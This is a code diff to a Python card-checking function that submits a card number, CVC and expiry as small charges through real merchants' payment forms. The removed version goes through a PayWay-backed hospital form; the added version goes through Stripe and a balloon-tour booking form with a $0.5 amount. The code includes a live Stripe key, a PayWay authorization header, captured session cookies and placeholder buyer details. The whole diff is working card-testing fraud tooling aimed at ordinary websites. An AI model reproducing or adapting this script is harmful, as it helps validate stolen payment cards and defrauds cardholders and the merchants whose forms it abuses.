@@ -14,82 +14,42 @@ def Tele(ccx):
 	random2 = random.randint(1, 99)
 	random3 = random.randint(20, 999)
 	
-	cookies = {
-	    'XSRF-TOKEN': 'eyJpdiI6ImF2RG9aVUMxMWl5QklaTlpMYzRaaHc9PSIsInZhbHVlIjoiT2dxV3VSODFWVjhuQ2hyajJQRjdpSGlaNDJpK1lsQXFpejFrOVRRbGd3Vm4zQ1owcXVvZVlEM1hVVkd0VmZLT09iMFd2V2NLSUJzbE40SnpTL2VuSnBXSW5nL29zMU5pcnlZUE4wMFdvRXNkNlkvMHprTHlrbUk4VzZKejJWT0oiLCJtYWMiOiJiOGQ0ZjA2YzVmZTRlZjg1NTRmODBhZDYzMGExMGJiNTdkMmQ4YjFiNjU1Mjc3YjRiZGM1MmFiZmVjOTdkMDk4IiwidGFnIjoiIn0%3D',
-	    'snapforms_session': 'eyJpdiI6IlVFbzJxMExUa1FwdWgrUnRjYktMQnc9PSIsInZhbHVlIjoiSjB3eWJ4bGFCOHJxYVJ2eEl2T0sxYjg1MzdTNGV0NmJMREphdHR0TU5sUmZnaTAwUnJ3eTE4a2NIblpoM1dYYzBJc3VOU284R3BHcWt1NHF0WHEveTlKeHczalJCTCsyNkJVS0dPUnFFTW43QWRzNHZYMC82T1NTcXVraEdNQVQiLCJtYWMiOiIwNDM3OTE0ZjIzYzQyMTFiNmVkZDE2ZmIxZTFjZDg0MDRjZmY1NWRlNjE5MmNkNDZkMzEyNmI1MGQ4MDc1ZGI2IiwidGFnIjoiIn0%3D',
-	}
-	
 	headers = {
-	    'authority': 'nrh.snapforms.com.au',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    # 'cookie': 'XSRF-TOKEN=eyJpdiI6ImF2RG9aVUMxMWl5QklaTlpMYzRaaHc9PSIsInZhbHVlIjoiT2dxV3VSODFWVjhuQ2hyajJQRjdpSGlaNDJpK1lsQXFpejFrOVRRbGd3Vm4zQ1owcXVvZVlEM1hVVkd0VmZLT09iMFd2V2NLSUJzbE40SnpTL2VuSnBXSW5nL29zMU5pcnlZUE4wMFdvRXNkNlkvMHprTHlrbUk4VzZKejJWT0oiLCJtYWMiOiJiOGQ0ZjA2YzVmZTRlZjg1NTRmODBhZDYzMGExMGJiNTdkMmQ4YjFiNjU1Mjc3YjRiZGM1MmFiZmVjOTdkMDk4IiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6IlVFbzJxMExUa1FwdWgrUnRjYktMQnc9PSIsInZhbHVlIjoiSjB3eWJ4bGFCOHJxYVJ2eEl2T0sxYjg1MzdTNGV0NmJMREphdHR0TU5sUmZnaTAwUnJ3eTE4a2NIblpoM1dYYzBJc3VOU284R3BHcWt1NHF0WHEveTlKeHczalJCTCsyNkJVS0dPUnFFTW43QWRzNHZYMC82T1NTcXVraEdNQVQiLCJtYWMiOiIwNDM3OTE0ZjIzYzQyMTFiNmVkZDE2ZmIxZTFjZDg0MDRjZmY1NWRlNjE5MmNkNDZkMzEyNmI1MGQ4MDc1ZGI2IiwidGFnIjoiIn0%3D',
-	    'referer': 'https://www.nrh.org.au/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'iframe',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'cross-site',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	}
-	
-	response = requests.get('https://nrh.snapforms.com.au/form/HAKZK05lMR', #cookies=cookies, 
-	headers=headers)
-	
-	fieldid = re.search(r'class="snap-field col-sm-12 snapfield-fieldtype_payment column-siblings-1" data-column="1" data-fieldid="(.*?)"', response.text).group(1)
-	formtoken = re.search(r'name="itoken" value="(.*?)"', response.text).group(1)
-	#print(formtoken)
-	
-	headers = {
-	    'authority': 'api.payway.com.au',
+	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
 	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    'authorization': 'Basic UTMyMTc3X1BVQl92dXh5NTk3OGNuNHhodXQ2dmp6ejh6ODVoZTh5MmpqcjZiMnp6cnoyZHd5bWc3anhkNnVydXFwaHVlYXE6',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://api.payway.com.au',
-	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-no-authenticate-basic': 'true',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = {
-	    'paymentMethod': 'creditCard',
-	    'connectionType': 'FRAME',
-	    'cardNumber': f'{n}',
-	    'cvn': f'{cvc}',
-	    'cardholderName': 'Yell Htet',
-	    'expiryDateMonth': f'{mm}',
-	    'expiryDateYear': f'{yy}',
-	    'threeDS2': 'false',
-	}
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F22fc71f1a3%3B+stripe-js-v3%2F22fc71f1a3%3B+card-element&referrer=https%3A%2F%2Fmoroccoballooning.com&time_on_page=62065&client_attribution_metadata[client_session_id]=d63af174-db60-47a2-ae3c-7ee9831d2083&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51RlWxzGLfSUH3qvsQcvhezGFA6Db505CqAcm8MpEnvXsq1YY088gBoB8b4IrfZTE9Erv0slr9Jz6oBozx7747Wrf002XyAfcDr'
 	
-	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
-	id = response.json()['singleUseTokenId']
-	#print(id)
+	pm = response.json()['id']
 	
 	cookies = {
-	    'XSRF-TOKEN': 'eyJpdiI6Ik80cUx5YVpZeFpQTC9OdndJYnRPbWc9PSIsInZhbHVlIjoienhBQ1hoQUhTYjZsTWU0YitYbk8xRHdsSEYzTWRtQ3FYYkFLeWN2cEs5bUR0akVNcDVXcGVHR1dMa0hUcENLU1FBVDAwVzl4UnZrMVZLR0hnaU1Xd1Rxbjg4bmEzbVUyelV6dnZrWmllK0JETlk1cGVmUG50Q1JnVmR4T0Rkb1MiLCJtYWMiOiI4NDZhZTlmYWE3NWU2OTU0MjkyNWYxNDBlZGRmZTU0NjM4NWYzNzYzMmUyMDQxOTQyYzVjMTk2MGEyYWE4OGUyIiwidGFnIjoiIn0%3D',
-	    'snapforms_session': 'eyJpdiI6InFJYzhHaXdHbzRET0ZxZDUxZkZocFE9PSIsInZhbHVlIjoiRUtsV3o2anRqRU5LUDRmOElJdlkxQnQwelh4Vm9idXNaZGo4MytyWW5nYml0VWZaM2RhcHQyK3ozRTlmMmpKbGVzdEhKRlNvYjQrdlBFMlB1Tmw0RlY0dk5aODNaeE1JdCtlUFlXc3p2MGY2Zlp3SGdkOThjcDFYYWU4YXhHNHgiLCJtYWMiOiI1ZjFiZmIxMGJiNWU4MDFjYmM2YmU1ZTY2YzU2OGY1ZTk5MzRjYTliZmY4NDgzNzJkM2I0MjgxNDRiZDE2ODFiIiwidGFnIjoiIn0%3D',
+	    '_gcl_au': '1.1.382083363.1775563658',
+	    '_ga': 'GA1.1.2028963988.1775563660',
+	    '_ga_LBBQEZMY3V': 'GS2.1.s1775563659$o1$g0$t1775563659$j60$l0$h0',
 	}
 	
 	headers = {
-	    'authority': 'nrh.snapforms.com.au',
+	    'authority': 'moroccoballooning.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'XSRF-TOKEN=eyJpdiI6Ik80cUx5YVpZeFpQTC9OdndJYnRPbWc9PSIsInZhbHVlIjoienhBQ1hoQUhTYjZsTWU0YitYbk8xRHdsSEYzTWRtQ3FYYkFLeWN2cEs5bUR0akVNcDVXcGVHR1dMa0hUcENLU1FBVDAwVzl4UnZrMVZLR0hnaU1Xd1Rxbjg4bmEzbVUyelV6dnZrWmllK0JETlk1cGVmUG50Q1JnVmR4T0Rkb1MiLCJtYWMiOiI4NDZhZTlmYWE3NWU2OTU0MjkyNWYxNDBlZGRmZTU0NjM4NWYzNzYzMmUyMDQxOTQyYzVjMTk2MGEyYWE4OGUyIiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6InFJYzhHaXdHbzRET0ZxZDUxZkZocFE9PSIsInZhbHVlIjoiRUtsV3o2anRqRU5LUDRmOElJdlkxQnQwelh4Vm9idXNaZGo4MytyWW5nYml0VWZaM2RhcHQyK3ozRTlmMmpKbGVzdEhKRlNvYjQrdlBFMlB1Tmw0RlY0dk5aODNaeE1JdCtlUFlXc3p2MGY2Zlp3SGdkOThjcDFYYWU4YXhHNHgiLCJtYWMiOiI1ZjFiZmIxMGJiNWU4MDFjYmM2YmU1ZTY2YzU2OGY1ZTk5MzRjYTliZmY4NDgzNzJkM2I0MjgxNDRiZDE2ODFiIiwidGFnIjoiIn0%3D',
-	    'origin': 'https://nrh.snapforms.com.au',
-	    'referer': 'https://nrh.snapforms.com.au/form/HAKZK05lMR',
+	    # 'cookie': '_gcl_au=1.1.382083363.1775563658; _ga=GA1.1.2028963988.1775563660; _ga_LBBQEZMY3V=GS2.1.s1775563659$o1$g0$t1775563659$j60$l0$h0',
+	    'origin': 'https://moroccoballooning.com',
+	    'referer': 'https://moroccoballooning.com/classic-hot-air-balloon/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -100,14 +60,22 @@ def Tele(ccx):
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = {
-	    'fieldid': f'{fieldid}',
-	    'formtoken': f'{formtoken}',
-	    'token': f'{id}',
-	    'amount': '1.00',
+	params = {
+	    't': '1775563721639',
 	}
 	
-	response = requests.post('https://nrh.snapforms.com.au/paywayDirect', #cookies=cookies, 
-	headers=headers, data=data)
+	data = {
+	    'data': f'__fluent_form_embded_post_id=736&_fluentform_3_fluentformnonce=114e61c651&_wp_http_referer=%2Fclassic-hot-air-balloon%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser06%40gmail.com&phone=%2B14303000850&booking_date=04%2F30%2F26&adults=1&children=0&input_text=&subtotal=120&fee=3.60&custom-payment-amount=0.5&payment_method_1=stripe&__stripe_payment_method_id={pm}',
+	    'action': 'fluentform_submit',
+	    'form_id': '3',
+	}
+	
+	response = requests.post(
+	    'https://moroccoballooning.com/wp-admin/admin-ajax.php',
+	    params=params,
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
 	return response.text
